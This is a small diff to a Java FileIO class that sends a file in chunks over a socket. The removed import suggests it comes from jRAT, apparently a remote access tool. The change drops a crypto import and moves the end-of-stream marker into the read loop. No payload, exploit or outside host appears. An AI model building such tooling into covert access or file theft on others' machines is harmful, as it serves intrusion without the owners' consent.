@@ -7,8 +7,6 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.net.Socket;
 
-import se.jrat.common.crypto.Crypto;
-
 public class FileIO {
 
 	public static final int CHUNKSIZE = 1024;
@@ -31,6 +29,10 @@ public class FileIO {
 			
 			dos.writeInt(read);
 			
+			if (read == -1) {
+				break;
+			}
+			
 			dos.write(chunk, 0, read);
 
 			if (listener != null) {
@@ -39,7 +41,7 @@ public class FileIO {
 		}
 		fileInput.close();
 
-		dos.writeInt(-1);
+		//dos.writeInt(-1);
 
 		socket.setSoTimeout(timeout);
 	}
